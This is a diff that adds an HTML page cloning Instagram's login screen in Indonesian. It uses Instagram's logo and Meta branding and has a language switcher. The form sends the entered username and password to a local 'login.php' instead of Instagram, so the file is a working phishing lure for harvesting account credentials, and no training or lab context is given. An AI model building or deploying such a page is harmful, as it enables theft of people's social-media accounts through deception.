@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+    body {
+      background: #121212;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+    }
+    .logo {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 30px;
+    }
+    .language {
+      font-size: 14px;
+      color: #b3b3b3;
+      margin-bottom: 40px;
+      cursor: pointer;
+      text-decoration: underline;
+    }
+    .input-group {
+      margin-bottom: 16px;
+    }
+    input {
+      width: 100%;
+      padding: 14px 16px;
+      background: #262626;
+      border: 1px solid #404040;
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
+      outline: none;
+    }
+    input::placeholder {
+      color: #888;
+    }
+    input:focus {
+      border-color: #0095f6;
+    }
+    .btn-login {
+      width: 100%;
+      padding: 14px;
+      background: #0095f6;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin: 20px 0;
+    }
+    .btn-login:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .forgot {
+      color: #0095f6;
+      text-decoration: none;
+      font-size: 14px;
+      margin: 10px 0 30px;
+      display: block;
+    }
+    .signup-btn {
+      width: 100%;
+      padding: 14px;
+      background: transparent;
+      color: #0095f6;
+      border: 1px solid #0095f6;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+    .meta {
+      font-size: 14px;
+      color: #888;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="language" id="languageSwitcher">Bahasa Indonesia</div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram" class="logo" />
+    
+    <form id="loginForm" method="post" action="login.php">
+      <div class="input-group">
+        <input type="text" name="username" placeholder="Nama pengguna, email, atau nomor telepon" autocomplete="off" required />
+      </div>
+      <div class="input-group">
+        <input type="password" name="password" id="passwordInput" placeholder="Kata sandi" required />
+      </div>
+      <button type="submit" class="btn-login" id="loginBtn" disabled>Login</button>
+    </form>
+
+    <a href="#" class="forgot">Lupa kata sandi?</a>
+    <button class="signup-btn">Buat akun baru</button>
+    <div class="meta">Meta</div>
+  </div>
+
+  <script>
+    // Terjemahan untuk semua teks
+    const translations = {
+      id: {
+        language: "Bahasa Indonesia",
+        usernamePlaceholder: "Nama pengguna, email, atau nomor telepon",
+        passwordPlaceholder: "Kata sandi",
+        loginBtn: "Login",
+        forgot: "Lupa kata sandi?",
+        signupBtn: "Buat akun baru",
+        meta: "Meta"
+      },
+      en: {
+        language: "English",
+        usernamePlaceholder: "Username, email, or phone number",
+        passwordPlaceholder: "Password",
+        loginBtn: "Log In",
+        forgot: "Forgot password?",
+        signupBtn: "Create new account",
+        meta: "Meta"
+      },
+      es: {
+        language: "Español",
+        usernamePlaceholder: "Nombre de usuario, correo o número de teléfono",
+        passwordPlaceholder: "Contraseña",
+        loginBtn: "Iniciar sesión",
+        forgot: "¿Olvidaste tu contraseña?",
+        signupBtn: "Crear nueva cuenta",
+        meta: "Meta"
+      },
+      fr: {
+        language: "Français",
+        usernamePlaceholder: "Nom d'utilisateur, e-mail ou numéro de téléphone",
+        passwordPlaceholder: "Mot de passe",
+        loginBtn: "Connexion",
+        forgot: "Mot de passe oublié ?",
+        signupBtn: "Créer un compte",
+        meta: "Meta"
+      },
+      de: {
+        language: "Deutsch",
+        usernamePlaceholder: "Benutzername, E-Mail oder Telefonnummer",
+        passwordPlaceholder: "Passwort",
+        loginBtn: "Anmelden",
+        forgot: "Passwort vergessen?",
+        signupBtn: "Neues Konto erstellen",
+        meta: "Meta"
+      }
+    };
+
+    let currentLang = 'id';
+
+    const langSwitcher = document.getElementById('languageSwitcher');
+    const usernameInput = document.querySelector('input[name="username"]');
+    const passwordInput = document.querySelector('input[name="password"]');
+    const loginBtn = document.getElementById('loginBtn');
+    const forgotLink = document.querySelector('.forgot');
+    const signupBtn = document.querySelector('.signup-btn');
+    const metaText = document.querySelector('.meta');
+
+    // Fungsi untuk menerapkan terjemahan
+    function applyLanguage(lang) {
+      currentLang = lang;
+      const t = translations[lang];
+
+      langSwitcher.textContent = t.language;
+      usernameInput.placeholder = t.usernamePlaceholder;
+      passwordInput.placeholder = t.passwordPlaceholder;
+      loginBtn.textContent = t.loginBtn;
+      forgotLink.textContent = t.forgot;
+      signupBtn.textContent = t.signupBtn;
+      metaText.textContent = t.meta;
+    }
+
+    // Urutan bahasa saat diklik (rotate)
+    const langOrder = ['id', 'en', 'es', 'fr', 'de'];
+    let langIndex = 0;
+
+    langSwitcher.addEventListener('click', () => {
+      langIndex = (langIndex + 1) % langOrder.length;
+      applyLanguage(langOrder[langIndex]);
+    });
+
+    // Validasi form tetap berjalan
+    function validateForm() {
+      const user = usernameInput.value.trim();
+      const pass = passwordInput.value.trim();
+      loginBtn.disabled = !(user && pass.length >= 6);
+    }
+
+    usernameInput.addEventListener('input', validateForm);
+    passwordInput.addEventListener('input', validateForm);
+  </script>
+</body>
+</html>
